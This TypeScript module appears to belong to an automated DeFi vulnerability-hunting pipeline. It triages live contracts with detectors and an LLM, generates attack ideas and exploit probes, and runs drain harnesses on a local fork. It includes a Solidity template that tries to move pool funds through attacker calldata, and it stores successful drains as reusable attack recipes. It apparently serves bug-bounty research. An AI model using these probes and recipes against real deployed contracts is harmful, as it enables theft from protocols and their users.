// Unknown-shape investigation pipeline: the "unknown → no probe" dead end
// becomes a real workflow.
//
//   1. Fetch VERIFIED source (livesrc) — when available it feeds the static
//      detector suite (real signal, not template guesses).
//   2. Feed recon + detectors + source/bytecode to the LLM triage step,
//      which returns a ranked exploit-class hypothesis and (validated)
//      probe parameters.
//   3. If the triage proposes a probe we can render, generate a
//      Solidity harness and run it on the LOCAL fork — the exact same
//      execution path (executeSim) as the hand-written template probes:
//      127.0.0.1 RPC only, nothing ever broadcast. The LLM never executes
//      anything and cannot call arbitrary RPC methods; every field of its
//      probe spec is regex-validated in triage.ts.
//
// Output is honest: "triage says X, probe drained / probe reverted /
// no probe proposed" — never a verdict without local execution.
import { execFileSync } from "node:child_process";
import { forgeEnv } from "./config.ts";
import { AnvilFork, reconPool, executeSim, toChecksumAddress, type PoolRecon, type ForkFinding } from "./fork.ts";
import { buildHarness, evaluateGenHarness, archiveGenHarness } from "./genharness.ts";
import { recordViolation, recordHeld, recordGenError, recordDeadend, targetOutcome, recordTargetOutcome, recordShapeFailureClass, recordShapeBackoff } from "./genlearn.ts";
import { learnFromProbe } from "./memory.ts";
import { captureProvenDrain } from "./techniques.ts";
import { ensureHypotheses, nextHypothesis, markHypothesis, claimTarget, releaseClaim } from "./ledger.ts";
import { runTestContractOnFork } from "./runner.ts";
import { recordGenResult } from "./bus.ts";
import { fetchLiveSource } from "./livesrc.ts";
import { CHAINS, type ChainSpec } from "./scan.ts";
import { runDetectorsOnText } from "./analysis.ts";
import { triageTargetOutcome, triageSummary, triageDeferralNote, type TriageHypothesis } from "./triage.ts";
import { suggestAttackIdeas } from "./attackideas.ts";
import { privilegeMap } from "./toolbox.ts";
import { enqueueTriage, resolveTriage } from "./triageQueue.ts";
import { upsertWatch, logEvent, snapshot, watchKeyOf } from "./bus.ts";
import { classifyTarget } from "./canoncode.ts";
import { upsertCampaign } from "./campaigns.ts";
import { bountyForProtocol, bountyLine } from "./immunefi.ts";
import { decompileBytecode } from "./decompile.ts";

/** OSINT metadata the seeder recorded for this address. Seeds set
 * name/category fields at enlist time (survive lastResult overwrites); the
 * seed note is the fallback for entries seeded before those fields existed. */
function osintCategory(nameKey: string): string | null {
  try {
    const w = watchEntry(nameKey);
    return w?.category ?? w?.lastResult?.match(/\(category ([A-Za-z]+)\)/)?.[1] ?? null;
  } catch {
    return null;
  }
}

/** Best-effort human name for the target (seed metadata, then seed note).
 * Used for the Immunefi slug lookup; null when unnamed. */
function protocolName(nameKey: string): string | null {
  try {
    const w = watchEntry(nameKey);
    return w?.name?.trim() || w?.lastResult?.match(/\[osint seed\] (.+?) \(category/)?.[1]?.trim() || null;
  } catch {
    return null;
  }
}

function watchEntry(nameKey: string) {
  try {
    const addr = nameKey.split(":")[1];
    return snapshot().watchlist[nameKey] ?? Object.values(snapshot().watchlist).find((x) => x.address?.toLowerCase() === addr);
  } catch {
    return undefined;
  }
}

/** Session-level bookkeeping dedupe (target, technique, status): a repeat
 * visit re-runs the same probe class and would otherwise re-write an identical
 * ledger row every cycle. A status CHANGE (held -> actionable) is new
 * evidence and is always recorded. */
const ledgerBookSeen = new Set<string>();

/** Selector-dense head of raw bytecode (dispatch tables live up front). */
function bytecodeHead(code: string): string | null {
  if (!code || code === "0x" || code.length < 40) return null;
  return code.startsWith("0x") ? code : `0x${code}`;
}

/** eth_getCode straight from the local fork — no remote calls from here. */
export async function getRuntimeCode(fork: AnvilFork, address: string): Promise<string | null> {
  try {
    return bytecodeHead(await fork.rpc("eth_getCode", [address, "latest"]));
  } catch {
    return null;
  }
}

export interface InvestigationResult {
  recon: PoolRecon;
  triage: TriageHypothesis | null; // null = disabled or nothing returned
  sourceProvider: string; // "etherscan" | "blockscout" | "sourcify" | "cache" | "none"
  finding: ForkFinding | null; // null when no probe ran
  summary: string; // human-readable one-liner for the bus/logs
}

export interface InvestigateOptions {
  /** Claim owner for the ledger; identifies which daemon is probing. */
  daemonId?: string;
  /** Probe classes the caller is willing to execute (default: all known). */
  probeClasses?: Set<string>;
  /** Decoded revert reason from a failed probe attempt. When present, the
   * triage prompt gains it as evidence (adaptive re-probe path) and triage
   * cache is bypassed so the new context actually changes the verdict. */
  revertContext?: string;
  /** Watchlist key this investigation's result belongs to — the SAME key the
   * caller will use for the target, so evidence from one target lands on one
   * row. Callers that key by `chain:address` pass their label; the daemon's
   * Ethereum fork watch passes the bare pool address. Never a display label:
   * see bus.watchKeyOf. */
  watchKey?: string;
}

/** The full unknown-shape pipeline for one target. Runs AFTER reconPool has
 * classified the shape as unknown — do not run it on known shapes. */
export async function investigateUnknownShape(
  fork: AnvilFork,
  chainId: string,
  chainName: string,
  address: string,
  chain?: ChainSpec,
  opts: InvestigateOptions = {}
): Promise<InvestigationResult> {
  // CLAIM: mark this target as being probed by THIS daemon so a parallel
  // worker (here or on another daemon) skips the duplicate. Released in
  // every exit path; a crashed daemon's claim expires via TTL.
  const claimOwner = opts.daemonId ?? `inv-${process.pid}`;
  const claimed = claimTarget(chainId, address, claimOwner);
  if (!claimed) {
    const reconSkipped = await reconPool(fork, address, chain);
    return {
      recon: reconSkipped,
      triage: null,
      sourceProvider: "none",
      finding: null,
      summary: "skipped — another daemon holds an active claim on this target",
    };
  }
  try {
    return await investigateWithClaim(fork, chainId, chainName, address, opts);
  } finally {
    releaseClaim(chainId, address, claimOwner);
  }
}

/** Body of the investigation — run at most once per target per fleet. */
async function investigateWithClaim(
  fork: AnvilFork,
  chainId: string,
  chainName: string,
  address: string,
  opts: InvestigateOptions = {}
): Promise<InvestigationResult> {
  const recon = await reconPool(fork, address, CHAINS.find((c) => c.id === chainId));
  // `label` is for logs/reports only. The watch key is a resolvable identity.
  const label = `${chainName}:${address.slice(0, 10)}…`;
  const watchKey = watchKeyOf(chainName, address, opts.watchKey);

  // ---- 0. bounty context (free, cached, best-effort) -------------------
  // A live Immunefi program raises escalation priority; its line also reminds
  // the triage model that only fork-reproduced findings are reportable.
  const nameKey = `${chainId}:${address.toLowerCase()}`;
  let bountyInfo: Awaited<ReturnType<typeof bountyForProtocol>> = null;
  try {
    bountyInfo = await bountyForProtocol(protocolName(nameKey));
  } catch { /* best-effort */ }

  // ---- 1. verified source + static detectors -------------------------
  let source: string | null = null;
  let provider = "none";
  let detectorSignals: string[] = [];
  try {
    const live = await fetchLiveSource(chainId, address);
    provider = live.provider;
    source = live.source;
    if (source) {
      // CANONICAL-CODE CLASSIFICATION: which parts of this target are stock
      // vs custom? Fleet-frequency evidence puts every verified target into
      // boilerplate / fork-delta / custom — the prioritization signal the
      // campaign scheduler and the funnel both read. Stock code is re-tested
      // by thousands of eyes; custom deltas are where bugs ship.
      try {
        const canon = classifyTarget(chainId, address, source);
        logEvent("scan", `${label}: code class ${canon.codeClass} — ${canon.reason}`);
      } catch { /* classification is best-effort */ }
      const hits = runDetectorsOnText(source, `${chainName}:${address.slice(0, 10)}…`);
      detectorSignals = [...new Set(hits.map((h) => h.detector))];
      const high = hits.filter((h) => h.severity === "high");
      if (high.length > 0) {
        logEvent("scan", `${label} HIGH-signal detectors on verified source: ${[...new Set(high.map((h) => h.detector))].join(", ")}`);
      }
      // HYPOTHESIS SEEDING: every distinct detector signal becomes a named,
      // testable hypothesis for this target. The ledger dedups; the count of
      // NEW rows is what tells the scheduler whether this visit bought new
      // information (0 new = pure repeat visit).
      try {
        const newHyps = ensureHypotheses(
          chainId,
          address,
          detectorSignals.map((d) => ({ technique: d, origin: "detector" as const }))
        );
        if (newHyps > 0) {
          logEvent("scan", `${label}: ${newHyps} new hypothesis row(s) seeded from ${detectorSignals.length} detector signal(s)`);
        }
      } catch { /* ledger is best-effort, never gates the investigation */ }
    }
  } catch {
    // provider outage — bytecode path below still applies
  }

  // ---- 2. LLM triage (no-op unless LAB_LLM_KEY is set) ----------------
  // A deferral (no capacity) is NOT a verdict: it is recorded as deferred and
  // queued for retry, because the old code wrote "triage unavailable" onto the
  // row and never came back — 510 of 808 targets ended up in that state.
  let triage: TriageHypothesis | null = null;
  let triageNote = "";
  try {
    let code = source ? null : await getRuntimeCode(fork, address);
    let decompiled: string | null = null;
    if (!source && code) {
      // Decompile unverified bytecode (heimdall, local) so the LLM triages
      // structure instead of raw hex. Falls back to hex on any failure.
      decompiled = await decompileBytecode(code, address);
    }
    const out = await triageTargetOutcome({
      chainId,
      address,
      shape: recon.shape,
      selectors: recon.selectors,
      ethWei: recon.ethWei,
      wethWei: recon.wethWei,
      detectorSignals,
      verifiedSource: source,
      bytecodeHex: code,
      decompiled,
      category: osintCategory(nameKey),
      bountyContext: bountyLine(bountyInfo) || null,
      revertContext: opts.revertContext ?? null,
    });
    triage = out.hypothesis;
    if (out.hypothesis) {
      resolveTriage(chainId, address); // analysed — no longer waiting on capacity
    } else if (out.retryable) {
      const q = enqueueTriage(chainId, address, out.reason);
      triageNote = q.gaveUp
        ? `triage gave up after ${q.attempts} deferral(s) (last: ${out.reason}${out.detail ? ` — ${out.detail}` : ""})`
        : `${triageDeferralNote(out)} (attempt ${q.attempts}, next in ${Math.max(1, Math.round(q.nextRetryMs / 1000))}s)`;
    } else {
      triageNote = triageDeferralNote(out);
      // Terminal for triage purposes: nothing to read, or no keys at all.
      // Either way there is no point re-queuing this target.
      if (out.reason === "no-input") resolveTriage(chainId, address);
    }
  } catch (e) {
    // An unexpected throw is a bug in triage, not a property of the target:
    // say so (and leave it queued so it gets another chance) rather than
    // reporting a clean-looking "no analysis" result.
    triage = null;
    triageNote = `triage ERRORED: ${(e as Error).message.slice(0, 160)}`;
    try { enqueueTriage(chainId, address, "http-error"); } catch { /* best-effort */ }
  }

  // ---- 2b. attack ideas (fire-and-forget; never delays the probe) ------
  // Triage answers the narrow question "is there an executable probe class?".
  // The ideas pass asks the broader one — "how WOULD you attack this?" — and
  // persists the ranked answer to the dashboard for human review. IDEAS ONLY:
  // nothing here executes; execution stays with the fork-probe pipeline.
  if (source && source.length >= 200) {
    void (async () => {
      // Privilege intel first (cheap: the fork is already in hand). Who holds
      // the keys changes which ideas make sense — an EOA admin suggests
      // key-compromise paths; a timelock means upgrades are slow; nothing
      // found means the deployer/immutable assumptions dominate.
      let privilegeIntel: string | null = null;
      try {
        const privs = await privilegeMap(fork, address);
        if (privs.length > 0) {
          privilegeIntel = privs.map((p) => `${p.source}=${p.who}(${p.kind})`).join(", ");
          const eoaAdmins = privs.filter((p) => p.kind === "eoa").length;
          if (eoaAdmins > 0) privilegeIntel += ` — ${eoaAdmins} EOA-controlled authority(ies): key compromise is a live path`;
        }
      } catch { /* toolbox is optional */ }
      const o = await suggestAttackIdeas({
        chainId,
        address,
        name: protocolName(nameKey) ?? undefined,
        shape: recon.shape,
        selectors: recon.selectors,
        detectorSignals,
        verifiedSource: source,
        category: osintCategory(nameKey),
        privilegeIntel,
      });
      if (o.reason === "ok" && o.ideas.length > 0) {
        logEvent("scan", `${label}: ${o.ideas.length} attack idea(s) recorded (LLM, ideas-only — not executed)`);
      }
    })().catch(() => { /* ideas are best-effort */ });
  }

  // ---- 3. run the probe the triage proposed (validated, local) --------
  let finding: ForkFinding | null = null;
  // HYPOTHESIS-DRIVEN PROBING: when the triage did not propose anything
  // executable, test the ledger's oldest untested hypothesis for this
  // target instead. A probe exists to buy information — an untested
  // hypothesis is exactly that.
  let hypothesisTechnique: string | null = null;
  if (!triage?.probe) {
    try {
      const h = nextHypothesis(chainId, address);
      if (h) {
        hypothesisTechnique = h.technique;
        logEvent("scan", `${label}: testing hypothesis "${h.technique}" (seeded by ${h.origin})`);
      }
    } catch { /* ledger is best-effort */ }
  }
  if (triage?.probe) {
    const allowed = opts.probeClasses;
    const ok = !allowed || allowed.has(triage.probe.class);
    if (!ok) {
      finding = {
        pool: address,
        technique: `triage:${triage.technique}`,
        applicable: false,
        simulated: false,
        profitWei: "0",
        notes: `triage proposed probe class "${triage.probe.class}" — not in the enabled set; hypothesis recorded, nothing executed`,
      };
    } else {
      const cs = toChecksumAddress(address);
      try {
        if (triage.probe.class === "side-entrance" || triage.probe.class === "erc4626-inflation") {
          // The triage's proposal re-uses the existing template probes —
          // battle-tested, and their entry assumptions are already encoded.
          const technique =
            triage.probe.class === "side-entrance" ? "side-entrance-reentrancy" : "erc4626-share-inflation";
          finding = await executeSim(
            fork,
            recon,
            `ForkSim_${cs.slice(0, 10)}`,
            (await import("./fork.ts")).renderSim(recon, technique),
            `triage:${technique}`
          );
        } else if (triage.probe.class === "unauthorized-mint") {
          // Unauthorized-mint probe: attempts the mint on the LOCAL fork and
          // checks whether supply / attacker balance actually increased.
          finding = await executeSim(
            fork,
            recon,
            `ForkSim_${cs.slice(0, 10)}`,
            (await import("./fork.ts")).renderSim(recon, "unauthorized-mint"),
            `triage:unauthorized-mint`
          );
        } else if (triage.probe.class === "flash-arbitrary-call") {
          finding = await runArbitraryCallProbe(fork, recon, triage.probe);
        } else if (triage.probe.class === "oracle-spot") {
          // Now executable: renderOracleSpotSim measures reserve-ratio shift
          // from a dealer-funded dump on the local fork. A >50% shift is the
          // finding signal — the operator confirms which lending protocol trusts
          // this pair's spot price.
          finding = await executeSim(
            fork,
            recon,
            `ForkSim_${cs.slice(0, 10)}`,
            (await import("./fork.ts")).renderSim(recon, "oracle-spot-manipulation"),
            `triage:oracle-spot-manipulation`
          );
        } else if (triage.probe.class === "lz-governance-replay") {
          // Cross-chain governance executor: id-only execution tracking lets a
          // captured proposal id re-execute attacker calldata. The probe reads
          // the proposal id from the target's storage layout (slot heuristics
          // in the template) and re-executes a different calldata under it.
          finding = await executeSim(
            fork,
            recon,
            `ForkSim_${cs.slice(0, 10)}`,
            (await import("./fork.ts")).renderLzGovReplaySim(recon),
            `triage:lz-governance-replay`
          );
        } else if (triage.probe.class === "lz-oft-dust") {
          // OFT shared-decimal conversion: reads the conversion rate config on
          // the local fork and arithmetic-checks ceil-vs-floor rounding. A
          // round-UP conversion is the finding (per-hop supply inflation).
          finding = await executeSim(
            fork,
            recon,
            `ForkSim_${cs.slice(0, 10)}`,
            (await import("./fork.ts")).renderOftDustSim(recon),
            `triage:lz-oft-dust`
          );
        }
      } catch (e) {
        finding = {
          pool: address,
          technique: `triage:${triage.technique}`,
          applicable: true,
          simulated: false,
          profitWei: "0",
          notes: `triage probe failed to render/run: ${(e as Error).message.slice(0, 160)}`,
        };
      }
    }
  }

  // HYPOTHESIS FALLBACK PROBE: exercise the named hypothesis on the local
  // fork when no other probe ran. Only the classes with a renderer are
  // executable; anything else is recorded honestly as held-with-evidence.
  if (!finding && hypothesisTechnique) {
    try {
      const t = hypothesisTechnique;
      const hSim = t.includes("erc4626") || t.includes("share")
        ? "erc4626-share-inflation"
        : t.includes("oracle") || t.includes("price")
          ? "oracle-spot-manipulation"
          : t.includes("mint")
            ? "unauthorized-mint"
            : t.includes("reentrancy") || t.includes("side-entrance")
              ? "side-entrance-reentrancy"
              : null;
      if (hSim) {
        const cs0 = toChecksumAddress(address);
        finding = await executeSim(fork, recon, `ForkSim_${cs0.slice(0, 10)}`, (await import("./fork.ts")).renderSim(recon, hSim), `hypothesis:${t}`);
      }
    } catch (e) {
      logEvent("scan", `${label}: hypothesis probe errored: ${(e as Error).message.slice(0, 120)}`);
    }
  }

  // ---- 3b. GENERIC invariant engine (no LLM needed) --------------------
  // When no validated probe ran (triage absent/probe-less/not in the allow
  // set), the universal property catalog still gets a shot: a fuzzer harness
  // generated from the target's VERIFIED SOURCE, bound to the live address.
  // Same rails as every probe: local fork, no broadcast, bounded primitives.
  // Only tried when verified source exists — bytecode-only targets cannot be
  // parsed by the ABI extractor yet (decompiler funnel is future work).
  let genSummary = "";
  if (source && !finding) {
    // LEARNED GATES (run the engine only when history says it can learn):
    //   1. repeat-visit skip — the engine already left this target with this
    //      exact verified source; re-running is compile-cost, not information.
    //   2. shape cooldown — the shape errored repeatedly (e.g. 427 "no
    //      harnessable shape" notes); back off, then let one attempt through
    //      when the window expires to see if anything changed.
    const genGate = (() => {
      try {
        const prev = targetOutcome(address);
        if (prev && prev.result !== "discovered" && prev.sourceLen === source.length) {
          return `skipped — generic engine already ran this target with the same verified source (${prev.result}; ${prev.note})`;
        }
        // Probe the shape cheaply before building: for "none"-heavy shapes the
        // priors tell us attempts are wasted until the cooldown lapses.
        return null;
      } catch {
        return null; // learning gates are advisory, never fatal
      }
    })();
    if (genGate) {
      genSummary = genGate;
    } else try {
      const gen = buildHarness(
        { challengeName: `fork-${chainId}-${address}`, sources: [source], mode: "address", bindAddress: toChecksumAddress(address), chainId },
        0
      );
      if (gen) {
        // CAMPAIGN REGISTRATION: this target now has a persistent accumulating
        // fuzz campaign. The one-shot 64-run smoke below stays as the first
        // datapoint; the daemon's campaign pass escalates from here.
        try { upsertCampaign({ chainId, address, shape: gen.shape }); } catch { /* best-effort */ }
        const gres = await runTestContractOnFork(gen.contractName, fork.localRpc);
        const ev = evaluateGenHarness(gres.output);
        const genResult = ev.discovered ? "discovered" : ev.compileError || ev.setupFailed ? "error" : "held";
        recordGenResult(address, {
          shape: gen.shape,
          result: genResult,
          invariant: ev.discovered ? ev.invariant : undefined,
        });
        // LEARNING LOOP (fork mode): same store as lab mode — a live-fork
        // violation on any target of a shape sharpens every future harness
        // of that shape, and dead ends are never re-derived.
        try {
          if (ev.discovered) {
            recordViolation(gen.shape, { invariant: ev.invariant, path: ev.path, profitWei: ev.profitWei });
            // SELF-LEARNED TECHNIQUE: a live-fork violation on ANY target of
            // this shape is a proven, transferable attack recipe.
            captureProvenDrain({
              origin: "generic-invariant",
              technique: `generic-invariant:${ev.invariant}`,
              shape: gen.shape,
              observation: `universal invariant "${ev.invariant}" violated on a live target`,
              path: ev.path,
              profitWei: ev.profitWei,
              provenOn: address,
            });
            learnFromProbe(address, gen.shape, `generic-invariant:${ev.invariant}`, "drained", ev.path ? `violating path: ${ev.path}` : undefined);
          } else if (ev.compileError) {
            recordGenError(gen.shape, "generic harness failed to compile on fork");
            recordShapeFailureClass(gen.shape, "compile", ev.compileErrorDetail ?? "compile error (no detail captured)");
            recordShapeBackoff(gen.shape);
          } else if (ev.setupFailed) {
            recordGenError(gen.shape, "setUp failed on fork (live state not bootstrapable)");
            recordShapeFailureClass(gen.shape, "setUp", "address-mode setUp failed: live constructor/state could not be bootstrapped from the fork");
            recordDeadend(gen.shape, "address-mode setUp failed: live constructor/state could not be bootstrapped from the fork");
            recordShapeBackoff(gen.shape);
          } else {
            recordHeld(gen.shape);
          }
          // Per-target outcome index: lets the NEXT visit of this target skip
          // the re-run when the verified source is unchanged.
          recordTargetOutcome(address, {
            shape: gen.shape,
            result: genResult,
            sourceLen: source.length,
            note: ev.discovered ? `violated ${ev.invariant}` : ev.compileError ? "compile error" : ev.setupFailed ? "setUp failed" : "invariants held",
          });
        } catch {
          // learning must never block a finding pipeline
        }
        if (ev.discovered) {
          finding = {
            pool: address,
            technique: `generic-invariant:${ev.invariant}`,
            applicable: true,
            simulated: true,
            profitWei: ev.profitWei ?? "0",
            notes: `GENERIC DISCOVERY on live fork: universal invariant "${ev.invariant}" violated${ev.path ? ` via ${ev.path}` : ""}`,
          };
          genSummary = `generic engine violated "${ev.invariant}"`;
        } else {
          genSummary = ev.compileError
            ? "generic harness did not compile (skipped honestly)"
            : ev.setupFailed
              ? "generic harness setup failed (shape heuristics did not fit)"
              : `generic invariants held (${gen.shape} harness)`;
        }
        archiveGenHarness(gen.filePath, gen.contractName);
      } else {
        genSummary = "no harnessable shape from verified source";
        recordGenResult(address, { shape: "none", result: "skipped", note: "no harnessable shape from verified source" });
        // Dead ends are per-shape, but "none" carries no shape — record the
        // skip honestly without polluting the per-shape ledger.
        try { recordGenError("none", "no harnessable shape from verified source"); } catch {}
        // Remember the skip per-target so a repeat visit doesn't re-derive it.
        try {
          recordTargetOutcome(address, { shape: "none", result: "skipped", sourceLen: source.length, note: "no harnessable shape from verified source" });
        } catch { /* best-effort */ }
      }
    } catch {
      genSummary = "generic engine errored (skipped honestly)";
    }
  }

  // HYPOTHESIS BOOKKEEPING: record what this visit actually learned.
  //   drained (profit > 0)               -> actionable
  //   simulated, nothing extracted       -> refuted for the tested technique
  //   could not run (revert/render/none) -> held, reason as evidence
  // When no ledger row matches the outcome's technique, the fallback marks
  // the NEXT untested hypothesis instead — a probe was chosen for it, so it
  // must not stay untested forever (the scheduler would re-pick it forever).
  // When the probe DRAINED, the exact path also joins the self-learned
  // technique library (see techniques.ts) — a live drain is transferable
  // knowledge, not just a watchlist note.
  try {
    const drained = finding?.simulated && finding.profitWei !== "0";
    if (drained && finding) {
      try {
        captureProvenDrain({
          origin: "triage-probe",
          technique: (finding.technique ?? "").replace(/^(triage|hypothesis):/, "") || "fork-probe",
          shape: recon.shape,
          observation: finding.notes.slice(0, 300),
          profitWei: finding.profitWei,
          provenOn: address,
        });
      } catch { /* technique capture is best-effort */ }
    }
    const evidence = finding
      ? finding.simulated && finding.profitWei !== "0"
        ? `drained ${finding.profitWei} wei — ${finding.notes}`
        : finding.notes
      : genSummary || triageNote || "no probe ran";
    const rawTested = finding?.technique ?? hypothesisTechnique;
    if (rawTested) {
      const status = finding?.simulated && finding.profitWei !== "0" ? "actionable" : finding?.simulated ? "refuted" : "held";
      const clean = rawTested.replace(/^triage:/, "").replace(/^hypothesis:/, "");
      // Session-level dedupe: repeat visits of one target re-run the same
      // probe class and would re-write identical ledger rows every cycle.
      // Key on (target, technique, status): a status CHANGE is new evidence
      // and is always recorded.
      const bookKey = `${chainId}:${address.toLowerCase()}:${clean}:${status}`;
      if (ledgerBookSeen.has(bookKey)) {
        // already recorded this exact outcome — skip silently
      } else {
        ledgerBookSeen.add(bookKey);
        const marked = markHypothesis(chainId, address, clean, status, evidence);
        if (!marked && status !== "actionable") {
          const fb = nextHypothesis(chainId, address);
          if (fb && fb.technique !== clean) markHypothesis(chainId, address, fb.technique, status, evidence);
        }
      }
    }
  } catch { /* ledger bookkeeping is best-effort */ }

  // ---- 4. honest summary ---------------------------------------------
  const parts: string[] = [];
  if (source) parts.push(`verified source (${provider}), ${detectorSignals.length} detector signal(s)`);
  else parts.push("no verified source");
  if (triage) parts.push(triageSummary(triage));
  else parts.push(triageNote || "triage did not run");
  if (finding) {
    parts.push(
      finding.simulated && finding.profitWei !== "0"
        ? `PROBE DRAINED ${finding.profitWei} wei — ${finding.notes}`
        : `probe: ${finding.notes}`
    );
  } else if (genSummary) {
    parts.push(genSummary);
  }
  const summary = parts.join(" | ");
  // Bounty + protocol name ride along on the watch entry so the dashboard can
  // show 💰 and a human name next to the address (see WatchState.bounty).
  const bountyTag = bountyInfo ? (bountyInfo.maxPayout ? `max ${bountyInfo.maxPayout}` : "listed") : undefined;
  const watchPatch: { address: string; shape: string; lastResult: string; bounty?: string; name?: string } = {
    address: watchKey,
    shape: recon.shape,
    lastResult: summary,
  };
  if (bountyTag) watchPatch.bounty = bountyTag;
  const pname = protocolName(nameKey);
  if (pname) watchPatch.name = pname;
  upsertWatch(watchPatch);
  // Mirror the bounty onto any canonical seed entry for the same address so
  // both UI rows (seed row + investigation row) show the program.
  if (bountyTag) {
    for (const [k, w] of Object.entries(snapshot().watchlist)) {
      if (k.toLowerCase() === address.toLowerCase() || w.address?.toLowerCase() === address.toLowerCase()) {
        if (w.bounty !== bountyTag) upsertWatch({ address: w.address ?? k, bounty: bountyTag });
      }
    }
  }
  logEvent("scan", `${label} investigation: ${summary.slice(0, 300)}`, { address, chainId, triage, finding });

  return { recon, triage, sourceProvider: provider, finding, summary };
}

/** flash-arbitrary-call probe: the triage claims target.call(data) from the
 * pool can move funds. The probe flashes the pool's own (or wrapped-native)
 * balance, makes the attacker-chosen call FROM the pool's context (the pool
 * has an execute()-style callback — that is what makes the shape unknown in
 * the first place), then checks whether the pool's balance dropped. Purely
 * local fork state; the funds belong to the fork, not to anyone. */
async function runArbitraryCallProbe(
  fork: AnvilFork,
  recon: PoolRecon,
  probe: NonNullable<TriageHypothesis["probe"]>
): Promise<ForkFinding> {
  if (!probe.callSelector) {
    return {
      pool: recon.address,
      technique: "triage:flash-arbitrary-call",
      applicable: false,
      simulated: false,
      profitWei: "0",
      notes: "triage proposed arbitrary-call but gave no callSelector — nothing executed",
    };
  }
  const cs = toChecksumAddress(recon.address);
  const sel = probe.callSelector.replace(/^0x/, "");
  const args = (probe.callArgs ?? []).map((a) => (/^\d+$/.test(a) ? padWord(BigInt(a)) : a.replace(/^0x/, "").padStart(64, "0")));
  const data = `0x${sel}${args.join("")}`;
  const callTarget = probe.callTarget ?? cs; // default: call back into the pool itself
  const fundHolder = toChecksumAddress(probe.fundHolder ?? recon.address);
  const simName = `TriageSim_${cs.slice(0, 10)}`;

  const src = `// SPDX-License-Identifier: MIT
// AGENT-GENERATED triage probe (LOCAL anvil fork only — never broadcast).
// Hypothesis under test: ${probe.rationale ?? "arbitrary call from pool context moves funds"}
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface ICallSink {
    function callExternal(address, bytes calldata) external;
}
interface ICallbackPool {
    function flashLoan(uint256) external;
}

contract TriageSim_${cs.slice(0, 10)} is Test {
    function run() public {
        address pool = ${cs};
        address fundHolder = ${fundHolder};
        uint256 before = fundHolder.balance;
        console2.log("[POOL_BEFORE]", before);

        address attacker = makeAddr("lootOwner");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        // Path A: the pool exposes a generic external-call entrypoint.
        if (ICallbackPool(pool).flashLoan.selector == ICallbackPool.flashLoan.selector) {
            // flashLoan exists; try the callback shape execute(target,data) via
            // low-level probing — the pool's callback is what receives control.
            (bool okA, ) = pool.call(abi.encodeWithSignature("flashLoan(uint256)", uint256(1)));
            okA; // silence unused warning; result parsed from balances below
        }

        // Path B: direct generic-call surface, if present.
        (bool okB, ) = pool.call(abi.encodeWithSignature("execute(address,bytes)", ${callTarget}, ${data}));
        okB;
        (bool okC, ) = pool.call(abi.encodeWithSignature("callExternal(address,bytes)", ${callTarget}, ${data}));
        okC;

        vm.stopPrank();
        uint256 afterB = fundHolder.balance;
        console2.log("[POOL_AFTER]", afterB);
        if (afterB < before) {
            console2.log("[FINDING] ARBITRARY-CALL: pool context executed attacker calldata and moved funds");
            console2.log("[PROFIT_WEI]", before - afterB);
        } else {
            console2.log("[NO_VIOLATION] no funds moved via proposed call surface");
        }
    }
}
`;

  return executeSim(fork, recon, simName, src, "triage:flash-arbitrary-call");
}

function padWord(v: bigint): string {
  return v.toString(16).padStart(64, "0");
}
